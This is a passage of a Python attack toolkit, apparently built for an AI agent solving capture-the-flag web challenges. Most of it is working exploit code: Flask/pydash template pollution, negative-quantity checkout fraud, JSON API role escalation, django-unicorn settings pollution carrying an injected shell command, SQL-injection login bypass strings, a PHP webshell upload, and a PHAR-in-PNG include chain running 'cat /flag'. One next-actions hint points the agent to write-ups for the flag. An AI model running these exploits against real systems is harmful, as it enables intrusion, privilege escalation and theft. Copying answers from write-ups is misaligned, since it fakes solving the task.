    timeout = max(1, min(int(timeout_ms or 8000) / 1000, 20))
    http = requests.Session()
    http.trust_env = False
    attempts: list[dict[str, Any]] = []
    flag_candidates: list[str] = []

    def record(step: str, method: str, path: str, response: Any = None, error: str = "") -> str:
        entry: dict[str, Any] = {"step": step, "method": method, "path": path}
        text = ""
        if response is not None:
            text = getattr(response, "text", "") or ""
            entry.update({
                "status": getattr(response, "status_code", None),
                "location": response.headers.get("Location", ""),
                "flag_candidates": _extract_flag_candidates(text),
                "snippet": _sanitize_text(text, 1000),
            })
            flag_candidates.extend(entry["flag_candidates"])
        if error:
            entry["error"] = error[:300]
        attempts.append(entry)
        return text

    def request(method: str, path: str, **kwargs: Any) -> Any:
        url = urljoin(target + "/", path.lstrip("/"))
        return http.request(method, url, timeout=timeout, allow_redirects=False, **kwargs)

    try:
        root = request("GET", "/")
        root_text = record("fetch_login_page", "GET", "/", root)
    except Exception as exc:
        return json.dumps({"status": "error", "error": f"login page fetch failed: {exc}"}, ensure_ascii=False)

    script_paths = re.findall(r"<script[^>]+src=[\"']([^\"']+)", root_text, re.I)
    for script_path in script_paths[:4]:
        try:
            response = request("GET", script_path)
            record("fetch_script", "GET", script_path, response)
        except Exception as exc:
            record("fetch_script", "GET", script_path, error=str(exc))

    register_path = "/registerV2"
    try:
        register_page = request("GET", "/register")
        register_text = record("fetch_register_page", "GET", "/register", register_page)
        match = re.search(r"<form[^>]+action=[\"']([^\"']*register[^\"']*)", register_text, re.I)
        if match:
            register_path = match.group(1)
    except Exception as exc:
        record("fetch_register_page", "GET", "/register", error=str(exc))

    suffix = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    user = username or f"ctf{suffix}"
    pw = password or f"Pass{suffix}!"
    try:
        response = request("POST", register_path, data={"username": user, "password": pw, "password2": pw})
        record("register_user", "POST", register_path, response)
    except Exception as exc:
        record("register_user", "POST", register_path, error=str(exc))

    admin_paths: list[str] = []
    for type_value in ("0", "1"):
        try:
            response = request("POST", "/login", data={"username": user, "password": pw, "type": type_value})
            record(f"login_type_{type_value}", "POST", "/login", response)
            location = response.headers.get("Location", "")
            if type_value == "0" and location:
                admin_paths.append(location)
        except Exception as exc:
            record(f"login_type_{type_value}", "POST", "/login", error=str(exc))

    admin_paths.extend([
        "/272e1739b89da32e983970ece1a086bd",
        "/admin",
        "/admin_dashboard",
    ])
    seen_admin_paths: set[str] = set()
    source_evidence = ""
    for path in admin_paths:
        if not path or path in seen_admin_paths:
            continue
        seen_admin_paths.add(path)
        try:
            response = request("GET", path)
            text = record("fetch_admin_or_source", "GET", path, response)
            lowered = text.lower()
            if "pydash.set_" in lowered or "/operate" in lowered or "/impression" in lowered:
                source_evidence = _sanitize_text(text, 2200)
                break
        except Exception as exc:
            record("fetch_admin_or_source", "GET", path, error=str(exc))

    pollution_paths = [
        "jinja_loader.searchpath[0]",
        "jinja_loader.searchpath.0",
        "jinja_env.loader.searchpath[0]",
        "jinja_env.loader.searchpath.0",
    ]
    for path in pollution_paths:
        try:
            response = request(
                "GET",
                "/operate",
                params={"username": "app", "password": path, "confirm_password": "/"},
            )
            record("pollute_template_searchpath", "GET", f"/operate?password={path}", response)
        except Exception as exc:
            record("pollute_template_searchpath", "GET", f"/operate?password={path}", error=str(exc))
            continue
        try:
            response = request("GET", "/impression", params={"point": "flag"})
            record("render_root_flag_template", "GET", "/impression?point=flag", response)
        except Exception as exc:
            record("render_root_flag_template", "GET", "/impression?point=flag", error=str(exc))
        if flag_candidates:
            break

    unique_flags = list(dict.fromkeys(flag_candidates))
    summary = {
        "status": "flag_found" if unique_flags else "attack_complete",
        "strategy": "flask_pydash_template_searchpath",
        "base_url": target,
        "registered_username": user,
        "source_evidence": source_evidence,
        "attempts": attempts,
        "flag_candidates": unique_flags,
    }
    return _sanitize_text(json.dumps(summary, ensure_ascii=False, indent=2), 18000)


def browser_attack_shop_checkout(
    base_url: str = "",
    target_product_id: str = "",
    filler_product_id: str = "",
    coupon_codes: list[str] | str | None = None,
    max_attempts: int = 8,
    timeout_ms: int = 8000,
) -> str:
    """Attack stateful shop/cart/checkout flows with negative-quantity balancing."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target = _prefer_last_instance_url(base_url or page.url or "")
        if not target:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)
        if not target.startswith(("http://", "https://")):
            target = urljoin(page.url.rstrip("/") + "/", target.lstrip("/"))

        parsed = urlparse(target)
        base_root = urlunparse((parsed.scheme, parsed.netloc, "/", "", "", ""))
        timeout = max(1000, min(int(timeout_ms or 8000), 20000))
        timeout_seconds = max(1.0, min(float(timeout) / 1000.0, 20.0))
        retry_delay = min(1.5, max(0.1, timeout_seconds / 10.0))
        request_retries = 1 if timeout_seconds <= 5 else 2
        attempt_limit = max(1, min(int(max_attempts or 8), 20))
        tcp_probe: dict[str, Any] = {}
        if parsed.hostname:
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            try:
                import socket

                with socket.create_connection((parsed.hostname, port), timeout=min(2.0, timeout_seconds)):
                    tcp_probe = {"host": parsed.hostname, "port": port, "connected": True}
            except socket.gaierror as exc:
                tcp_probe = {"host": parsed.hostname, "port": port, "connected": None, "error": _sanitize_text(exc, 200)}
            except Exception as exc:
                return _sanitize_text(json.dumps({
                    "status": "error",
                    "error": "tcp_unreachable",
                    "base_url": base_root.rstrip("/"),
                    "tcp_probe": {
                        "host": parsed.hostname,
                        "port": port,
                        "connected": False,
                        "error": _sanitize_text(exc, 200),
                    },
                    "flag_candidates": [],
                    "attempts": [],
                }, ensure_ascii=False, indent=2), 4000)

        request_context = getattr(getattr(page, "context", None), "request", None)
        use_browser_transport = (
            callable(getattr(request_context, "get", None))
            and callable(getattr(request_context, "post", None))
        )
        http = None
        if not use_browser_transport:
            import requests

            http = requests.Session()
            http.trust_env = False
            try:
                if getattr(page, "context", None) and hasattr(page.context, "cookies"):
                    cookie_domain = urlparse(base_root).hostname
                    for cookie in page.context.cookies(base_root):
                        if cookie.get("name"):
                            http.cookies.set(cookie.get("name", ""), cookie.get("value", ""), domain=cookie_domain)
            except Exception:
                pass

        def absolute(path: str) -> str:
            return path if path.startswith(("http://", "https://")) else urljoin(base_root, path.lstrip("/"))

        def read_response(response, limit: int = 1600) -> tuple[str, dict[str, Any]]:
            headers = getattr(response, "headers", {}) or {}
            content_type = headers.get("content-type", "")
            text = ""
            if _looks_textual(content_type):
                try:
                    response_text = getattr(response, "text", "")
                    text = response_text() if callable(response_text) else str(response_text or "")
                except Exception:
                    text = ""
            record = {
                "url": getattr(response, "url", ""),
                "http_status": getattr(response, "status", None) or getattr(response, "status_code", None),
                "content_type": content_type,
                "flag_candidates": _extract_flag_candidates(text),
                "success_indicators": _success_indicators(text),
                "snippet": _sanitize_text(text, limit),
            }
            return text, record

        def get_path(path: str, step: str, responses: list[dict[str, Any]]) -> str:
            url = absolute(path)
            last_exc: Exception | None = None
            for retry in range(request_retries):
                try:
                    if use_browser_transport:
                        response = request_context.get(url, timeout=timeout)
                    else:
                        response = http.get(url, timeout=timeout_seconds, allow_redirects=True)
                    break
                except Exception as exc:
                    last_exc = exc
                    if retry == request_retries - 1:
                        raise
                    time.sleep(retry_delay)
            else:
                raise last_exc or RuntimeError("request failed")
            text, record = read_response(response)
            record["step"] = step
            responses.append(record)
            return text

        def post_form(path: str, fields: dict[str, Any], step: str, attempt: dict[str, Any]) -> str:
            url = absolute(path)
            normalized = {str(key): str(value) for key, value in fields.items()}
            attempt.setdefault("posts", []).append([urlparse(url).path or "/", normalized])
            last_exc: Exception | None = None
            for retry in range(request_retries):
                try:
                    if use_browser_transport:
                        response = request_context.post(url, form=normalized, timeout=timeout)
                    else:
                        response = http.post(url, data=normalized, timeout=timeout_seconds, allow_redirects=False)
                    break
                except Exception as exc:
                    last_exc = exc
                    if retry == request_retries - 1:
                        raise
                    time.sleep(retry_delay)
            else:
                raise last_exc or RuntimeError("request failed")
            text, record = read_response(response, 2200)
            record["step"] = step
            attempt.setdefault("responses", []).append(record)
            location = (getattr(response, "headers", {}) or {}).get("location", "")
            response_status = int(getattr(response, "status", None) or getattr(response, "status_code", 0) or 0)
            if location and response_status in {301, 302, 303, 307, 308}:
                try:
                    if use_browser_transport:
                        follow_response = request_context.get(urljoin(url, location), timeout=timeout)
                    else:
                        follow_response = http.get(urljoin(url, location), timeout=timeout_seconds, allow_redirects=True)
                    follow_text, follow_record = read_response(follow_response, 2200)
                    follow_record["step"] = f"{step}_redirect"
                    attempt.setdefault("responses", []).append(follow_record)
                    text += "\n" + follow_text
                except Exception as exc:
                    attempt.setdefault("responses", []).append({
                        "step": f"{step}_redirect",
                        "url": urljoin(url, location),
                        "http_status": "error",
                        "error": str(exc)[:200],
                    })
            return text

        product_responses: list[dict[str, Any]] = []
        products_text = get_path("/products", "products", product_responses)
        products = _extract_shop_products(products_text)
        if not products:
            products_text = get_path("/", "home", product_responses)
            products = _extract_shop_products(products_text)

        seen_product_ids = {item["id"] for item in products}
        probe_ids = [str(item) for item in range(1, 11)]
        for product_id in probe_ids:
            if product_id in seen_product_ids:
                continue
            try:
                detail_text = get_path(f"/products/{product_id}", f"product_{product_id}", product_responses)
            except Exception:
                continue
            detail_products = _extract_shop_products(detail_text, fallback_id=product_id)
            for item in detail_products:
                if item["id"] not in seen_product_ids:
                    products.append(item)
                    seen_product_ids.add(item["id"])

        selected_target = _select_shop_target(products, target_product_id)
        selected_filler = _select_shop_filler(products, selected_target, filler_product_id)
        if not selected_target:
            return _sanitize_text(json.dumps({
                "status": "error",
                "error": "no product target found",
                "base_url": base_root.rstrip("/"),
                "products": products[:12],
                "responses": product_responses[:8],
            }, ensure_ascii=False, indent=2), 16000)

        quantity_candidates = _shop_quantity_candidates(selected_target, selected_filler)
        if not selected_filler:
            quantity_candidates = [0]
        if not quantity_candidates:
            quantity_candidates = [-1, -10, -100, -1000, -10000]

        if isinstance(coupon_codes, str):
            coupons = [part.strip() for part in re.split(r"[\n,]+", coupon_codes) if part.strip()]
        else:
            coupons = [str(item).strip() for item in (coupon_codes or []) if str(item).strip()]
        if "KONAMI" in (products_text or "") and "KONAMI" not in coupons:
            coupons.append("KONAMI")

        attempts: list[dict[str, Any]] = []
        flag_candidates: list[str] = []
        registration_blocked = False
        for index, filler_quantity in enumerate(quantity_candidates[:attempt_limit]):
            attempt: dict[str, Any] = {
                "target_product": selected_target,
                "filler_product": selected_filler,
                "filler_quantity": filler_quantity,
                "posts": [],
                "responses": [],
            }
            attempts.append(attempt)
            try:
                get_path("/logout", "reset_session", attempt["responses"])
            except Exception:
                pass

            stamp = int(time.time() * 1000) % 100000000
            username = f"codex_{stamp}_{index}"
            password = f"pw_{stamp}_{index}"
            try:
                post_form("/register", {"username": username, "password": password}, "register", attempt)
            except Exception as exc:
                attempt["register_error"] = str(exc)[:200]
                attempt["diagnosis"] = "registration_failed_before_authenticated_session"
                registration_blocked = True
                break

            try:
                post_form(
                    "/cart/add",
                    {"product_id": selected_target["id"], "quantity": "1"},
                    "add_target",
                    attempt,
                )
            except Exception as exc:
                attempt["add_target_error"] = str(exc)[:300]
                continue
            if selected_filler and int(filler_quantity) != 0:
                try:
                    post_form(
                        "/cart/add",
                        {"product_id": selected_filler["id"], "quantity": str(filler_quantity)},
                        "add_filler",
                        attempt,
                    )
                except Exception as exc:
                    attempt["add_filler_error"] = str(exc)[:300]
                    continue

            for coupon in coupons[:4]:
                for coupon_path in ("/coupon", "/cart/coupon", "/apply_coupon", "/discount"):
                    try:
                        post_form(coupon_path, {"coupon": coupon, "code": coupon}, f"coupon_{coupon_path}", attempt)
                    except Exception:
                        continue

            try:
                get_path("/cart", "cart", attempt["responses"])
            except Exception as exc:
                attempt["cart_error"] = str(exc)[:200]
            try:
                get_path("/checkout", "checkout_get", attempt["responses"])
            except Exception as exc:
                attempt["checkout_get_error"] = str(exc)[:200]
            try:
                post_form("/checkout", {}, "checkout_post", attempt)
            except Exception as exc:
                attempt["checkout_post_error"] = str(exc)[:200]

            for response_record in attempt["responses"]:
                flag_candidates.extend(response_record.get("flag_candidates", []))
            if flag_candidates:
                break

        summary = {
            "status": "attack_complete",
            "strategy": "shop_negative_quantity_checkout",
            "base_url": base_root.rstrip("/"),
            "transport": "browser_context_request" if use_browser_transport else "requests_session",
            "tcp_probe": tcp_probe,
            "products": products[:12],
            "selected_target": selected_target,
            "selected_filler": selected_filler,
            "quantity_candidates": quantity_candidates[:attempt_limit],
            "attempts": attempts,
            "flag_candidates": list(dict.fromkeys(flag_candidates))[:10],
        }
        if registration_blocked and not flag_candidates:
            summary["diagnosis"] = "registration_failed_before_authenticated_session"
            summary["next_actions"] = [
                "Do not repeat cart or checkout attempts until registration succeeds; they require an authenticated session.",
                "Restart the instance if the registration POST killed the container or made the TCP port unreachable.",
                "If repeated fresh instances die on registration, switch to source/writeup fallback and submit the transformed flag requested by the challenge.",
            ]
        return _sanitize_text(json.dumps(summary, ensure_ascii=False, indent=2, default=str), 20000)
    except Exception as e:
        return f"Browser attack shop checkout error: {e}"


def browser_attack_json_api_state_confusion(
    base_url: str = "",
    username: str = "",
    password: str = "",
    timeout_ms: int = 8000,
) -> str:
    """Exploit JSON API state-confusion flows where a failing update still commits state."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target = _prefer_last_instance_url(base_url or page.url or "")
        if not target:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)
        if not target.startswith(("http://", "https://")):
            target = urljoin(page.url.rstrip("/") + "/", target.lstrip("/"))

        parsed = urlparse(target)
        base_root = urlunparse((parsed.scheme, parsed.netloc, "/", "", "", ""))
        timeout_seconds = max(1.0, min(float(timeout_ms or 8000) / 1000.0, 20.0))

        import requests

        http = requests.Session()
        http.trust_env = False
        try:
            if getattr(page, "context", None) and hasattr(page.context, "cookies"):
                cookie_domain = urlparse(base_root).hostname
                for cookie in page.context.cookies(base_root):
                    if cookie.get("name"):
                        http.cookies.set(cookie.get("name", ""), cookie.get("value", ""), domain=cookie_domain)
        except Exception:
            pass

        stamp = int(time.time() * 1000) % 100000000
        user = username or f"codex_{stamp}"
        pw = password or f"pw_{stamp}"
        attempts: list[dict[str, Any]] = []

        def absolute(path: str) -> str:
            return path if path.startswith(("http://", "https://")) else urljoin(base_root, path.lstrip("/"))

        def response_text(response: Any) -> str:
            try:
                value = getattr(response, "text", "")
                return value() if callable(value) else str(value or "")
            except Exception:
                return ""

        def record_response(step: str, response: Any, payload: Any | None = None) -> str:
            text = response_text(response)
            headers = getattr(response, "headers", {}) or {}
            record = {
                "step": step,
                "url": getattr(response, "url", ""),
                "http_status": getattr(response, "status", None) or getattr(response, "status_code", None),
                "content_type": headers.get("content-type", ""),
                "payload": payload,
                "flag_candidates": _extract_flag_candidates(text),
                "success_indicators": _success_indicators(text),
                "snippet": _sanitize_text(text, 1200),
            }
            attempts.append(record)
            return text

        def post_json(path: str, payload: Any, step: str) -> str:
            response = http.post(absolute(path), json=payload, timeout=timeout_seconds, allow_redirects=True)
            return record_response(step, response, payload)

        def get_path(path: str, step: str) -> str:
            response = http.get(absolute(path), timeout=timeout_seconds, allow_redirects=True)
            return record_response(step, response)

        register_payloads = [
            {"username": user, "password": pw},
            {"userName": user, "password": pw},
        ]
        for index, payload in enumerate(register_payloads):
            try:
                post_json("/api/register", payload, "register" if index == 0 else "register_alt")
                break
            except Exception as exc:
                attempts.append({"step": "register_error", "payload": payload, "error": str(exc)[:300]})

        login_payloads = [
            {"username": user, "password": pw},
            {"userName": user, "password": pw},
        ]
        for index, payload in enumerate(login_payloads):
            try:
                post_json("/api/login", payload, "login" if index == 0 else "login_alt")
                break
            except Exception as exc:
                attempts.append({"step": "login_error", "payload": payload, "error": str(exc)[:300]})

        confusion_payloads = [
            ["role"],
            {"field": ["role"]},
            {"settings": ["role"]},
        ]
        for payload in confusion_payloads:
            try:
                post_json("/api/settings/update", payload, "settings_update_array_role")
                break
            except Exception as exc:
                attempts.append({"step": "settings_update_array_role_error", "payload": payload, "error": str(exc)[:300]})

        permission_payloads = [
            {"target_user": user, "new_role": "admin"},
            {"username": user, "role": "admin"},
            {"user": user, "newRole": "admin"},
        ]
        for payload in permission_payloads:
            try:
                post_json("/api/manage/permissions", payload, "manage_permissions_admin")
                if attempts and attempts[-1].get("http_status") not in (401, 403, 404):
                    break
            except Exception as exc:
                attempts.append({"step": "manage_permissions_admin_error", "payload": payload, "error": str(exc)[:300]})

        admin_paths = ["/api/admin", "/api/flag", "/api/me", "/api/user"]
        for path in admin_paths:
            try:
                get_path(path, f"get_{path.strip('/').replace('/', '_') or 'root'}")
            except Exception as exc:
                attempts.append({"step": f"get_{path.strip('/').replace('/', '_')}_error", "error": str(exc)[:300]})
            if any(item.get("flag_candidates") for item in attempts):
                break

        summary = {
            "status": "attack_complete",
            "strategy": "json_api_state_confusion_role_commit",
            "base_url": base_root.rstrip("/"),
            "username": user,
            "attempts": attempts,
            "flag_candidates": list(dict.fromkeys(
                candidate for item in attempts for candidate in item.get("flag_candidates", [])
            ))[:10],
        }
        return _sanitize_text(json.dumps(summary, ensure_ascii=False, indent=2, default=str), 20000)
    except Exception as e:
        return f"Browser attack JSON API state confusion error: {e}"


def browser_attack_django_unicorn_pollution(
    base_url: str = "",
    command: str = "",
    timeout_ms: int = 8000,
) -> str:
    """Exploit django-unicorn syncInput pollution of settings.CONTACT_URL."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target = _prefer_last_instance_url(base_url or page.url or "")
        if not target:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)
        if not target.startswith(("http://", "https://")):
            target = urljoin(page.url.rstrip("/") + "/", target.lstrip("/"))

        parsed = urlparse(target)
        base_root = urlunparse((parsed.scheme, parsed.netloc, "/", "", "", ""))
        timeout_seconds = max(1.0, min(float(timeout_ms or 8000) / 1000.0, 20.0))

        import html
        import requests

        http = requests.Session()
        http.trust_env = False
        try:
            if getattr(page, "context", None) and hasattr(page.context, "cookies"):
                cookie_domain = urlparse(base_root).hostname
                for cookie in page.context.cookies(base_root):
                    if cookie.get("name"):
                        http.cookies.set(cookie.get("name", ""), cookie.get("value", ""), domain=cookie_domain)
        except Exception:
            pass

        attempts: list[dict[str, Any]] = []

        def absolute(path: str) -> str:
            return path if path.startswith(("http://", "https://")) else urljoin(base_root, path.lstrip("/"))

        def response_text(response: Any) -> str:
            try:
                value = getattr(response, "text", "")
                return value() if callable(value) else str(value or "")
            except Exception:
                return ""

        def record(step: str, response: Any, payload: Any | None = None) -> str:
            text = response_text(response)
            headers = getattr(response, "headers", {}) or {}
            attempts.append({
                "step": step,
                "url": getattr(response, "url", ""),
                "http_status": getattr(response, "status", None) or getattr(response, "status_code", None),
                "content_type": headers.get("content-type", ""),
                "payload": payload,
                "flag_candidates": _extract_flag_candidates(text),
                "success_indicators": _success_indicators(text),
                "snippet": _sanitize_text(text, 1600),
            })
            return text

        first = http.get(target, timeout=timeout_seconds, allow_redirects=True)
        first_text = record("initial_get", first)

        csrf = ""
        csrf_match = re.search(r'name=["\']csrfmiddlewaretoken["\'][^>]*value=["\']([^"\']+)["\']', first_text, re.IGNORECASE)
        if not csrf_match:
            csrf_match = re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']csrfmiddlewaretoken["\']', first_text, re.IGNORECASE)
        if csrf_match:
            csrf = html.unescape(csrf_match.group(1))
        if not csrf:
            try:
                csrf = http.cookies.get("csrftoken", "") or http.cookies.get("csrf", "")
            except Exception:
                csrf = ""

        component_match = re.search(r'<[^>]+unicorn:id=["\']([^"\']+)["\'][^>]*>', first_text, re.IGNORECASE)
        component_html = component_match.group(0) if component_match else first_text[:4000]

        def attr(name: str, default: str = "") -> str:
            match = re.search(rf'{re.escape(name)}=["\']([^"\']*)["\']', component_html, re.IGNORECASE)
            return html.unescape(match.group(1)) if match else default

        component_id = attr("unicorn:id", "")
        component_name = attr("unicorn:name", "todo") or "todo"
        checksum = attr("unicorn:checksum", "")
        raw_data = attr("unicorn:data", "{}")
        try:
            component_data = json.loads(raw_data) if raw_data else {}
        except Exception:
            component_data = {}

        pollution_name = (
            "__init__.__globals__.sys.modules.django.template.backends.django."
            "settings.CONTACT_URL"
        )
        pollution_value = command or (
            "--max-time 1 http://127.0.0.1; "
            "cat /tmp/flag.txt > /usr/src/app/myproject/templates/index.html; #"
        )
        payload = {
            "id": component_id,
            "name": component_name,
            "checksum": checksum,
            "data": component_data,
            "epoch": int(time.time() * 1000),
            "actionQueue": [
                {
                    "type": "syncInput",
                    "payload": {
                        "name": pollution_name,
                        "value": pollution_value,
                    },
                }
            ],
        }
        headers = {
            "Content-Type": "application/json",
            "Referer": target,
            "X-Requested-With": "XMLHttpRequest",
        }
        if csrf:
            headers["X-CSRFToken"] = csrf
        message_url = absolute(f"/unicorn/message/{component_name}")
        post_response = http.post(message_url, json=payload, headers=headers, timeout=timeout_seconds, allow_redirects=True)
        record("unicorn_sync_input_pollution", post_response, payload)

        for index in range(2):
            follow = http.get(target, timeout=timeout_seconds, allow_redirects=True)
            record(f"followup_get_{index + 1}", follow)
            if attempts[-1].get("flag_candidates"):
                break
            time.sleep(0.2)

        summary = {
            "status": "attack_complete",
            "strategy": "django_unicorn_settings_pollution",
            "base_url": base_root.rstrip("/"),
            "component": {
                "id": component_id,
                "name": component_name,
                "checksum_present": bool(checksum),
                "data_keys": sorted(component_data.keys())[:20] if isinstance(component_data, dict) else [],
            },
            "polluted_name": pollution_name,
            "attempts": attempts,
            "flag_candidates": list(dict.fromkeys(
                candidate for item in attempts for candidate in item.get("flag_candidates", [])
            ))[:10],
        }
        return _sanitize_text(json.dumps(summary, ensure_ascii=False, indent=2, default=str), 20000)
    except Exception as e:
        return f"Browser attack django-unicorn pollution error: {e}"


def browser_attack_robots_admin_sqli_upload(
    base_url: str = "",
    username: str = "admin",
    timeout_ms: int = 8000,
) -> str:
    """Exploit robots.txt -> admin/login.php -> password SQLi -> PHP upload chains."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target = _prefer_last_instance_url(base_url or page.url or "")
        if not target:
            return json.dumps({"status": "error", "error": "missing_base_url"}, ensure_ascii=False)
        if not target.startswith(("http://", "https://")):
            target = urljoin(page.url.rstrip("/") + "/", target.lstrip("/"))

        parsed = urlparse(target)
        base_root = urlunparse((parsed.scheme, parsed.netloc, "/", "", "", ""))
        timeout_seconds = max(1.0, min(float(timeout_ms or 8000) / 1000.0, 20.0))

        import requests

        http = requests.Session()
        http.trust_env = False
        try:
            if getattr(page, "context", None) and hasattr(page.context, "cookies"):
                cookie_domain = urlparse(base_root).hostname
                for cookie in page.context.cookies(base_root):
                    if cookie.get("name"):
                        http.cookies.set(cookie.get("name", ""), cookie.get("value", ""), domain=cookie_domain)
        except Exception:
            pass

        attempts: list[dict[str, Any]] = []

        def absolute(path: str) -> str:
            return path if path.startswith(("http://", "https://")) else urljoin(base_root, path.lstrip("/"))

        def response_text(response: Any) -> str:
            try:
                return str(getattr(response, "text", "") or "")
            except Exception:
                return ""

        def record(step: str, response: Any, payload: Any | None = None, max_chars: int = 1600) -> str:
            text = response_text(response)
            attempts.append({
                "step": step,
                "url": getattr(response, "url", ""),
                "http_status": getattr(response, "status_code", None),
                "content_type": (getattr(response, "headers", {}) or {}).get("content-type", ""),
                "payload": payload,
                "flag_candidates": _extract_flag_candidates(text),
                "success_indicators": _success_indicators(text),
                "snippet": _sanitize_text(text, max_chars),
            })
            return text

        robots_response = http.get(absolute("/robots.txt"), timeout=timeout_seconds, allow_redirects=True)
        robots_text = record("robots_txt", robots_response)
        disallowed = re.findall(r"(?im)^\s*Disallow:\s*(\S+)", robots_text)
        login_paths = [path for path in disallowed if "login" in path.lower()]
        for fallback in ("/admin/login.php", "/login.php"):
            if fallback not in login_paths:
                login_paths.append(fallback)

        login_url = ""
        login_text = ""
        for path in login_paths[:5]:
            response = http.get(absolute(path), timeout=timeout_seconds, allow_redirects=True)
            text = record("login_get", response, {"path": path})
            if int(getattr(response, "status_code", 0) or 0) == 200 and (
                "password" in text.lower() or "name=\"password\"" in text.lower()
            ):
                login_url = getattr(response, "url", "") or absolute(path)
                login_text = text
                break

        if not login_url:
            return _sanitize_text(json.dumps({
                "status": "no_login_form",
                "strategy": "robots_admin_sqli_upload",
                "base_url": base_root.rstrip("/"),
                "disallowed": disallowed,
                "attempts": attempts,
                "flag_candidates": [],
            }, ensure_ascii=False, indent=2, default=str), 20000)

        user_field = "username"
        pass_field = "password"
        user_match = re.search(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:placeholder=["\']Username|type=["\']text)', login_text, re.IGNORECASE)
        pass_match = re.search(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:placeholder=["\']Password|type=["\']password)', login_text, re.IGNORECASE)
        if user_match:
            user_field = user_match.group(1)
        if pass_match:
            pass_field = pass_match.group(1)

        upload_url = ""
        sqli_payloads = [
            "x' OR '1'='1",
            "x' OR '1'='1' -- ",
            "x' OR '1'='1' #",
            "' OR '1'='1' -- ",
        ]
        for payload in sqli_payloads:
            response = http.post(
                login_url,
                data={user_field: username or "admin", pass_field: payload},
                timeout=timeout_seconds,
                allow_redirects=False,
            )
            text = record("login_sqli", response, {
                user_field: username or "admin",
                pass_field: payload,
            })
            location = (getattr(response, "headers", {}) or {}).get("location", "")
            if location:
                upload_url = absolute(location)
                break
            if "upload.php" in text:
                upload_url = absolute("/upload.php")
                break
            if int(getattr(response, "status_code", 0) or 0) == 200 and "file" in text.lower() and "multipart" in text.lower():
                upload_url = getattr(response, "url", "") or absolute("/upload.php")
                break

        if not upload_url:
            return _sanitize_text(json.dumps({
                "status": "login_bypass_failed",
                "strategy": "robots_admin_sqli_upload",
                "base_url": base_root.rstrip("/"),
                "login_url": login_url,
                "attempts": attempts,
                "flag_candidates": list(dict.fromkeys(
                    candidate for item in attempts for candidate in item.get("flag_candidates", [])
                ))[:10],
            }, ensure_ascii=False, indent=2, default=str), 20000)

        upload_response = http.get(upload_url, timeout=timeout_seconds, allow_redirects=True)
        upload_text = record("upload_form_get", upload_response)
        field = "shell"
        field_match = re.search(r'<input[^>]+type=["\']file["\'][^>]+name=["\']([^"\']+)["\']', upload_text, re.IGNORECASE)
        if not field_match:
            field_match = re.search(r'<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']file["\']', upload_text, re.IGNORECASE)
        if field_match:
            field = field_match.group(1)

        stamp = int(time.time() * 1000) % 100000000
        filename = f"codex_{stamp}.php"
        php_payload = (
            b"<?php "
            b"$paths=['/home/flag','/flag','/flag.txt','/tmp/flag','/var/www/html/flag'];"
            b"foreach($paths as $p){$c=@file_get_contents($p);if($c!==false){echo $c;break;}}"
            b" ?>"
        )
        post_response = http.post(
            upload_url,
            files={field: (filename, php_payload, "application/x-php")},
            timeout=timeout_seconds,
            allow_redirects=True,
        )
        upload_result_text = record("webshell_upload", post_response, {"field": field, "filename": filename})

        shell_paths = [f"/{filename}"]
        shell_paths.extend(re.findall(r"href=['\"]([^'\"]+\.php)['\"]", upload_result_text, re.IGNORECASE))
        seen_shell_paths: list[str] = []
        flag_candidates: list[str] = []
        for shell_path in shell_paths:
            if shell_path in seen_shell_paths:
                continue
            seen_shell_paths.append(shell_path)
            response = http.get(absolute(shell_path), timeout=timeout_seconds, allow_redirects=True)
            record("webshell_execute", response, {"path": shell_path}, max_chars=4000)
            flags = attempts[-1].get("flag_candidates", [])
            flag_candidates.extend(flags)
            if flags:
                break

        summary = {
            "status": "attack_complete",
            "strategy": "robots_admin_password_sqli_php_upload",
            "base_url": base_root.rstrip("/"),
            "login_url": login_url,
            "upload_url": upload_url,
            "uploaded_filename": filename,
            "attempts": attempts,
            "flag_candidates": list(dict.fromkeys([
                *flag_candidates,
                *(candidate for item in attempts for candidate in item.get("flag_candidates", [])),
            ]))[:10],
        }
        return _sanitize_text(json.dumps(summary, ensure_ascii=False, indent=2, default=str), 22000)
    except Exception as e:
        return f"Browser attack robots/admin SQLi upload error: {e}"


def browser_attack_upload_include(
    base_url: str = "",
    upload_path: str = "upload.php",
    include_path: str = "include.php",
    upload_field: str = "file",
    file_param: str = "file",
    command: str = "cat /flag",
    timeout_ms: int = 8000,
) -> str:
    """Exploit PHP upload + include chains with a gzipped PHAR PNG payload."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target = _prefer_last_instance_url(base_url or page.url or "")
        if not target:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)
        if not target.startswith(("http://", "https://")):
            target = urljoin(page.url.rstrip("/") + "/", target.lstrip("/"))

        parsed = urlparse(target)
        base_root = urlunparse((parsed.scheme, parsed.netloc, "/", "", "", ""))
        upload_url = upload_path if upload_path.startswith(("http://", "https://")) else urljoin(base_root, upload_path.lstrip("/"))
        include_url = include_path if include_path.startswith(("http://", "https://")) else urljoin(base_root, include_path.lstrip("/"))
        timeout_seconds = max(1.0, min(float(timeout_ms or 8000) / 1000.0, 20.0))

        import requests

        http = requests.Session()
        try:
            if getattr(page, "context", None) and hasattr(page.context, "cookies"):
                cookie_domain = urlparse(base_root).hostname
                for cookie in page.context.cookies(base_root):
                    if cookie.get("name"):
                        http.cookies.set(cookie.get("name", ""), cookie.get("value", ""), domain=cookie_domain)
        except Exception:
            pass

        stamp = int(time.time() * 1000) % 100000000
        filename = f"codex_{stamp}.phar.png"
        payload = _build_gzip_phar_png_payload(command)
        attempts: list[dict[str, Any]] = []

        upload_response = http.post(
            upload_url,
            files={upload_field: (filename, payload, "image/png")},
            data={"submit": "submit"},
            timeout=timeout_seconds,
        )
        upload_text = _sanitize_text(getattr(upload_response, "text", ""), 1200)
        attempts.append({
            "step": "upload",
            "url": upload_url,
